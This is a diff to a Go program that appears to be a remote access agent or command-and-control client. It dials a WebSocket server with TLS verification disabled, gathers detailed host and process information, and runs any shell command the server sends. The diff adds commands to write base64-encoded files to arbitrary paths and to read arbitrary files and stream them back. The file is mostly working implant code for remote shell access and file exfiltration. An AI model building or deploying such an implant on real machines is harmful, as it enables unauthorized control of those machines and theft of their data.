@@ -2,27 +2,29 @@
 package main
 
 import (
+	"bufio"
+	"crypto/tls"
+	"encoding/base64"
 	"fmt"
-	"github.com/gorilla/websocket"
+	"io"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
 
+	"github.com/gorilla/websocket"
 	"github.com/shirou/gopsutil/v3/cpu"
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/host"
 	"github.com/shirou/gopsutil/v3/mem"
 	"github.com/shirou/gopsutil/v3/net"
 	"github.com/shirou/gopsutil/v3/process"
-
-	"strings"
-	"crypto/tls"
-	"time"
-	"os"
-	"os/exec"
 )
 
 const (
-	HOST string = "127.0.0.1"
-	PORT int = 8765
-	INSECURESKIPVERIFY bool = true
+	HOST               string = "127.0.0.1"
+	PORT               int    = 8765
+	INSECURESKIPVERIFY bool   = true
 )
 
 type ExecuteCommand struct {
@@ -31,87 +33,87 @@ type ExecuteCommand struct {
 
 // 获取系统信息
 func (e *ExecuteCommand) get_systeminfo() map[string]interface{} {
-    system_info := make(map[string]interface{})
-    
-    // 获取主机信息
-    if host_info, err := host.Info(); err != nil {
-        system_info["host"] = "error: " + err.Error()
-    } else {
-        system_info["host"] = host_info
-    }
+	system_info := make(map[string]interface{})
 
-    // 获取CPU信息
-    if cpu_info, err := cpu.Info(); err != nil {
-        system_info["cpu"] = "error: " + err.Error()
-    } else {
-        system_info["cpu"] = cpu_info
-    }
+	// 获取主机信息
+	if host_info, err := host.Info(); err != nil {
+		system_info["host"] = "error: " + err.Error()
+	} else {
+		system_info["host"] = host_info
+	}
 
-    // 获取内存信息
-    if mem_info, err := mem.VirtualMemory(); err != nil {
-        system_info["memory"] = "error: " + err.Error()
-    } else {
-        system_info["memory"] = mem_info
-    }
+	// 获取CPU信息
+	if cpu_info, err := cpu.Info(); err != nil {
+		system_info["cpu"] = "error: " + err.Error()
+	} else {
+		system_info["cpu"] = cpu_info
+	}
 
-    // 获取交换内存信息
-    if smem_info, err := mem.SwapMemory(); err != nil {
-        system_info["swap_memory"] = "error: " + err.Error()
-    } else {
-        system_info["swap_memory"] = smem_info
-    }
+	// 获取内存信息
+	if mem_info, err := mem.VirtualMemory(); err != nil {
+		system_info["memory"] = "error: " + err.Error()
+	} else {
+		system_info["memory"] = mem_info
+	}
 
-    // 获取磁盘分区信息
-    if partition_info, err := disk.Partitions(true); err != nil {
-        system_info["partition"] = "error: " + err.Error()
-    } else {
-        system_info["partition"] = partition_info
-        // 获取磁盘使用情况
-        if len(partition_info) > 0 {
-            if usage_info, err := disk.Usage(partition_info[0].Mountpoint); err != nil {
-                system_info["disk_usage"] = "error: " + err.Error()
-            } else {
-                system_info["disk_usage"] = usage_info
-            }
-        }
-    }
+	// 获取交换内存信息
+	if smem_info, err := mem.SwapMemory(); err != nil {
+		system_info["swap_memory"] = "error: " + err.Error()
+	} else {
+		system_info["swap_memory"] = smem_info
+	}
 
-    // 获取磁盘IO信息
-    if io_info, err := disk.IOCounters(); err != nil {
-        system_info["io_disk"] = "error: " + err.Error()
-    } else {
-        system_info["io_disk"] = io_info
-    }
+	// 获取磁盘分区信息
+	if partition_info, err := disk.Partitions(true); err != nil {
+		system_info["partition"] = "error: " + err.Error()
+	} else {
+		system_info["partition"] = partition_info
+		// 获取磁盘使用情况
+		if len(partition_info) > 0 {
+			if usage_info, err := disk.Usage(partition_info[0].Mountpoint); err != nil {
+				system_info["disk_usage"] = "error: " + err.Error()
+			} else {
+				system_info["disk_usage"] = usage_info
+			}
+		}
+	}
 
-    // 获取网络接口信息
-    if interfaces_info, err := net.Interfaces(); err != nil {
-        system_info["interfaces"] = "error: " + err.Error()
-    } else {
-        system_info["interfaces"] = interfaces_info
-    }
+	// 获取磁盘IO信息
+	if io_info, err := disk.IOCounters(); err != nil {
+		system_info["io_disk"] = "error: " + err.Error()
+	} else {
+		system_info["io_disk"] = io_info
+	}
 
-    // 获取网络IO信息
-    if io_net_info, err := net.IOCounters(true); err != nil {
-        system_info["io_network"] = "error: " + err.Error()
-    } else {
-        system_info["io_network"] = io_net_info
-    }
+	// 获取网络接口信息
+	if interfaces_info, err := net.Interfaces(); err != nil {
+		system_info["interfaces"] = "error: " + err.Error()
+	} else {
+		system_info["interfaces"] = interfaces_info
+	}
 
-    // 获取进程信息
-    if processes_info, err := process.Processes(); err != nil {
-        system_info["processes"] = "error: " + err.Error()
-    } else {
-        system_info["processes"] = processes_info
-    }
+	// 获取网络IO信息
+	if io_net_info, err := net.IOCounters(true); err != nil {
+		system_info["io_network"] = "error: " + err.Error()
+	} else {
+		system_info["io_network"] = io_net_info
+	}
 
-    return system_info
+	// 获取进程信息
+	if processes_info, err := process.Processes(); err != nil {
+		system_info["processes"] = "error: " + err.Error()
+	} else {
+		system_info["processes"] = processes_info
+	}
+
+	return system_info
 }
 
 // 执行命令并返回结果
 func (e *ExecuteCommand) execute_command(command string) map[string]interface{} {
 	host_info, _ := host.Info()
 	var shell, flag string
-	
+
 	if host_info.OS == "windows" {
 		shell, flag = "cmd", "/C"
 	} else {
@@ -121,7 +123,7 @@ func (e *ExecuteCommand) execute_command(command string) map[string]interface{} 
 	cmd := exec.Command(shell, flag, command)
 	output, err := cmd.CombinedOutput()
 	output_str := string(output)
-	
+
 	if len(output_str) > 600000 {
 		output_str = output_str[:600000]
 	}
@@ -140,7 +142,7 @@ func (e *ExecuteCommand) execute_command(command string) map[string]interface{} 
 func (e *ExecuteCommand) execute_bg_command(command string) {
 	host_info, _ := host.Info()
 	var shell, flag string
-	
+
 	if host_info.OS == "windows" {
 		shell, flag = "cmd", "/C"
 	} else {
@@ -160,26 +162,25 @@ func (e *ExecuteCommand) change_directory(directory string) string {
 	return "Directory changed successfully"
 }
 
-
 // 获取系统信息
 func get_system_info() string {
 	hostInfo, err := host.Info()
 	if err != nil {
 		return "error"
 	}
-	
+
 	cpuInfo, err := cpu.Info()
 	if err != nil {
 		return "error"
 	}
-	
+
 	system := hostInfo.OS
 	node := hostInfo.Hostname
 	release := hostInfo.PlatformVersion
 	version := hostInfo.KernelVersion
 	machine := hostInfo.KernelArch
 	processor := cpuInfo[0].ModelName
-	
+
 	systemInfo := fmt.Sprintf("%s %s %s %s %s %s",
 		system, node, release, version, machine, processor)
 
@@ -192,11 +193,11 @@ func client_loop() {
 	tls_config := &tls.Config{
 		InsecureSkipVerify: INSECURESKIPVERIFY,
 	}
-	
+
 	dialer := websocket.Dialer{
 		TLSClientConfig: tls_config,
 	}
-	
+
 	for {
 		conn, _, err := dialer.Dial(
 			fmt.Sprintf("wss://%s:%d", HOST, PORT),
@@ -214,14 +215,14 @@ func client_loop() {
 		}
 
 		Executecommand := &ExecuteCommand{conn: conn}
-		
+
 		for {
 			_, message, err := conn.ReadMessage()
 			if err != nil {
 				conn.Close()
 				break
 			}
-			
+
 			command := string(message)
 			if command == "exit" {
 				// 退出命令
@@ -255,6 +256,76 @@ func client_loop() {
 				directory := command[len("change_directory:"):]
 				result := Executecommand.change_directory(directory)
 				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
+					conn.Close()
+					break
+				}
+			} else if strings.HasPrefix(command, "upload:") {
+				// 上传文件
+				message := "ok"
+				upload_file_info := command[len("upload:"):]
+				file_parts := strings.SplitN(upload_file_info, "(*.*)", 2)
+				if err != nil {
+					message = err.Error()
+				} else {
+					if file_parts[1] == "" {
+						file_name := file_parts[0]
+						// Create a new file and close it
+						file, err := os.Create(file_name)
+						file.Write([]byte(""))
+						if err != nil {
+							message = err.Error()
+						} else {
+							file.Close()
+						}
+					} else {
+						file_path := file_parts[0]
+						// Open or create the file with write permissions
+						file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+						if err != nil {
+							message = err.Error()
+						} else {
+							content := file_parts[1]
+							// Decode base64 encoded content
+							decoded_content, err := base64.StdEncoding.DecodeString(content)
+							if err != nil {
+								message = err.Error()
+							} else if _, err := file.Write(decoded_content); err != nil {
+								message = err.Error()
+							}
+							defer file.Close()
+						}
+					}
+				}
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
+					conn.Close()
+					break
+				}
+			} else if strings.HasPrefix(command, "download:") {
+			    // 下载文件
+				message := "finish:zhaobokai"
+				file_path := command[len("download:"):]
+				file, err := os.Open(file_path)
+				if err != nil {
+					message = err.Error()
+				}
+				defer file.Close()
+				bufio.NewReader(file)
+				buffer := make([]byte, 4096)
+				for {
+					n, err := file.Read(buffer)
+					if err != nil {
+						if err != io.EOF {
+							message = "error:zhaobokai" + err.Error()
+						}
+						break
+					}
+					encode_content := base64.StdEncoding.EncodeToString(buffer[:n])
+					if err := conn.WriteMessage(websocket.TextMessage, []byte(encode_content)); err != nil {
+						conn.Close()
+						break
+					}
+				}
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 					conn.Close()
 					break
 				}
